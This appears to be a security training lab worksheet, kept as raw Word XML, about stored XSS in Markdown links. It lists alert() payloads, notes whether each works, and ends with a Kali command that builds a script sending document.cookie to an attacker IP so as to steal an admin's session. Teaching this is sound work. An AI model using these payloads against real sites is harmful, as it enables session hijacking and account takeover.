          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>_&lt;script&gt;alert('xss');&lt;/script&gt;_</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BC150A4" w14:textId="77777777" w:rsidR="004A7D32" w:rsidRPr="00FA4E5F" w:rsidRDefault="00000000" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="425"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:pict w14:anchorId="685E7667">
          <v:rect id="_x0000_s2101" style="position:absolute;left:0;text-align:left;margin-left:21.75pt;margin-top:32.05pt;width:390.75pt;height:47.1pt;z-index:5">
            <v:textbox>
              <w:txbxContent>
                <w:p w14:paraId="24862F57" w14:textId="77777777" w:rsidR="004A7D32" w:rsidRPr="0051736E" w:rsidRDefault="004A7D32" w:rsidP="004A7D32">
                  <w:pPr>
                    <w:pStyle w:val="ListParagraph"/>
                    <w:ind w:left="284"/>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS" w:cs="Times New Roman"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                      <w:lang w:val="en-AU"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS" w:cs="Times New Roman"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                      <w:lang w:val="en-AU"/>
                    </w:rPr>
                    <w:t>no, it appears in italics</w:t>
                  </w:r>
                </w:p>
                <w:p w14:paraId="4AD2EA9B" w14:textId="77777777" w:rsidR="004A7D32" w:rsidRPr="00CA4DA6" w:rsidRDefault="004A7D32" w:rsidP="004A7D32">
                  <w:pPr>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                    </w:rPr>
                  </w:pPr>
                </w:p>
              </w:txbxContent>
            </v:textbox>
            <w10:wrap type="square"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r w:rsidR="004A7D32" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Does it work?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023F661E" w14:textId="77777777" w:rsidR="004A7D32" w:rsidRPr="00FA4E5F" w:rsidRDefault="004A7D32" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="425"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="553D4BC3" w14:textId="77777777" w:rsidR="008F2E27" w:rsidRPr="00FA4E5F" w:rsidRDefault="008F2E27" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="425"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Observe the following screen capture for the XSS sequence that we did so far:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B9060E5" w14:textId="77777777" w:rsidR="00267B2E" w:rsidRPr="00FA4E5F" w:rsidRDefault="001C35C4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="425"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:pict w14:anchorId="39BBC385">
          <v:shape id="_x0000_i1042" type="#_x0000_t75" style="width:322.55pt;height:173.55pt;visibility:visible">
            <v:imagedata r:id="rId25" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE1EEA2" w14:textId="77777777" w:rsidR="0051736E" w:rsidRPr="00FA4E5F" w:rsidRDefault="0051736E" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Try inserting XSS script inside the </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>( )</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> part of a link. e.g.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="628C9497" w14:textId="77777777" w:rsidR="0051736E" w:rsidRPr="00FA4E5F" w:rsidRDefault="0051736E" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="425"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>[test1](&lt;script&gt;alert('xss');&lt;/script&gt;)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="462D5998" w14:textId="77777777" w:rsidR="004A7D32" w:rsidRPr="00FA4E5F" w:rsidRDefault="00000000" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="425"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:pict w14:anchorId="0AF144A2">
          <v:rect id="_x0000_s2099" style="position:absolute;left:0;text-align:left;margin-left:21.75pt;margin-top:32.05pt;width:390.75pt;height:60.65pt;z-index:3">
            <v:textbox>
              <w:txbxContent>
                <w:p w14:paraId="5F02DBA8" w14:textId="77777777" w:rsidR="004A7D32" w:rsidRPr="0051736E" w:rsidRDefault="004A7D32" w:rsidP="004A7D32">
                  <w:pPr>
                    <w:pStyle w:val="ListParagraph"/>
                    <w:ind w:left="284"/>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS" w:cs="Times New Roman"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                      <w:lang w:val="en-AU"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS" w:cs="Times New Roman"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                      <w:lang w:val="en-AU"/>
                    </w:rPr>
                    <w:t xml:space="preserve">almost </w:t>
                  </w:r>
                  <w:r w:rsidRPr="004A7D32">
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS" w:cs="Times New Roman"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                      <w:lang w:val="en-AU"/>
                    </w:rPr>
                    <w:t>test1;&lt;/script&gt;)</w:t>
                  </w:r>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS" w:cs="Times New Roman"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                      <w:lang w:val="en-AU"/>
                    </w:rPr>
                    <w:t xml:space="preserve"> is displayed, with a broken link under test1</w:t>
                  </w:r>
                </w:p>
                <w:p w14:paraId="0BB19BCB" w14:textId="77777777" w:rsidR="004A7D32" w:rsidRPr="00CA4DA6" w:rsidRDefault="004A7D32" w:rsidP="004A7D32">
                  <w:pPr>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                    </w:rPr>
                  </w:pPr>
                </w:p>
              </w:txbxContent>
            </v:textbox>
            <w10:wrap type="square"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r w:rsidR="004A7D32" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Does it work?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D2F5E8" w14:textId="77777777" w:rsidR="004A7D32" w:rsidRPr="00FA4E5F" w:rsidRDefault="004A7D32" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="425"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C30AF61" w14:textId="77777777" w:rsidR="004A7D32" w:rsidRPr="00FA4E5F" w:rsidRDefault="004A7D32" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Try inserting XSS script inside the</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> [ ] </w:t>
      </w:r>
      <w:r w:rsidR="008F2E27" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>part of a link. Like the following script, ensure no space in between</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32C4FDDF" w14:textId="77777777" w:rsidR="0051736E" w:rsidRPr="00FA4E5F" w:rsidRDefault="00000000" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="425"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:pict w14:anchorId="64E2ADF3">
          <v:rect id="_x0000_s2102" style="position:absolute;left:0;text-align:left;margin-left:20.25pt;margin-top:53.8pt;width:390.75pt;height:41.9pt;z-index:6">
            <v:textbox>
              <w:txbxContent>
                <w:p w14:paraId="54048953" w14:textId="77777777" w:rsidR="004A7D32" w:rsidRPr="00CA4DA6" w:rsidRDefault="00C61CDE" w:rsidP="00C61CDE">
                  <w:pPr>
                    <w:pStyle w:val="ListParagraph"/>
                    <w:ind w:left="284"/>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS" w:cs="Times New Roman"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                      <w:lang w:val="en-AU"/>
                    </w:rPr>
                    <w:t>Yes! we have a popup</w:t>
                  </w:r>
                </w:p>
              </w:txbxContent>
            </v:textbox>
            <w10:wrap type="square"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r w:rsidR="0051736E" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0051736E" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>[&lt;script&gt;alert('xss');&lt;/script&gt;](test2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4C217D" w14:textId="77777777" w:rsidR="0051736E" w:rsidRPr="00FA4E5F" w:rsidRDefault="0051736E" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="425"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Does it work?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65AD8B34" w14:textId="77777777" w:rsidR="0051736E" w:rsidRPr="00FA4E5F" w:rsidRDefault="001C35C4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="425"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:pict w14:anchorId="7348957D">
          <v:shape id="_x0000_i1043" type="#_x0000_t75" style="width:415.75pt;height:223.9pt;visibility:visible">
            <v:imagedata r:id="rId26" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DC23F14" w14:textId="77777777" w:rsidR="00E816EC" w:rsidRPr="00FA4E5F" w:rsidRDefault="00E816EC" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Let's check how many characters we can insert. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FFABF67" w14:textId="77777777" w:rsidR="00E816EC" w:rsidRPr="00FA4E5F" w:rsidRDefault="00E816EC" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Try</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="418DA3CA" w14:textId="77777777" w:rsidR="00E816EC" w:rsidRPr="00FA4E5F" w:rsidRDefault="00E816EC" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>[&lt;script&gt;alert('abcdefghijklmnopqrstuvwxyz');&lt;/script&gt;](test3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D16042" w14:textId="77777777" w:rsidR="00E816EC" w:rsidRPr="00FA4E5F" w:rsidRDefault="00000000" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="76923C"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:pict w14:anchorId="67383ED5">
          <v:rect id="_x0000_s2103" style="position:absolute;left:0;text-align:left;margin-left:15pt;margin-top:30.9pt;width:408pt;height:41.9pt;z-index:7">
            <v:textbox>
              <w:txbxContent>
                <w:p w14:paraId="3E9ED8E8" w14:textId="77777777" w:rsidR="00E816EC" w:rsidRPr="00CA4DA6" w:rsidRDefault="00E816EC" w:rsidP="00E816EC">
                  <w:pPr>
                    <w:pStyle w:val="ListParagraph"/>
                    <w:ind w:left="284"/>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS" w:cs="Times New Roman"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                      <w:lang w:val="en-AU"/>
                    </w:rPr>
                    <w:t>Yes! we have a popup</w:t>
                  </w:r>
                </w:p>
              </w:txbxContent>
            </v:textbox>
            <w10:wrap type="square"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00E816EC" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Does it work</w:t>
      </w:r>
      <w:r w:rsidR="00E816EC" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="76923C"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0866C90E" w14:textId="77777777" w:rsidR="00EB5680" w:rsidRPr="00FA4E5F" w:rsidRDefault="00EB5680" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A3BC1F9" w14:textId="77777777" w:rsidR="00C97604" w:rsidRPr="00FA4E5F" w:rsidRDefault="00C97604" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Let's try to write an exploit in 30 characters or less. </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="002060"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">The easiest way is to write the javascript in a remote file and then call it from the </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="002060"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>XSS. We want to get the Session Cookie of the admin – not our own. That means that we plant a stored XSS script which sends us the cookie of whoever visits the site.</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="118D6DE3" w14:textId="77777777" w:rsidR="00EB5680" w:rsidRPr="00FA4E5F" w:rsidRDefault="00C97604" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">In Kali, open a </w:t>
      </w:r>
      <w:r w:rsidR="008F2E27" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Terminal</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> window and type:</w:t>
      </w:r>
      <w:r w:rsidR="00B71FAB" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> (NOTE: IP of the Kali)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79BD5DAD" w14:textId="77777777" w:rsidR="00C97604" w:rsidRPr="00FA4E5F" w:rsidRDefault="00C97604" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284" w:right="-625"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">echo </w:t>
      </w:r>
      <w:r w:rsidR="00CC0F44" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>$.get('http://192.168.</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>100.200</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>?cookie=' +document.cookie);" &gt; .j</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70BFA93C" w14:textId="77777777" w:rsidR="00EB5680" w:rsidRPr="00FA4E5F" w:rsidRDefault="00C97604" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
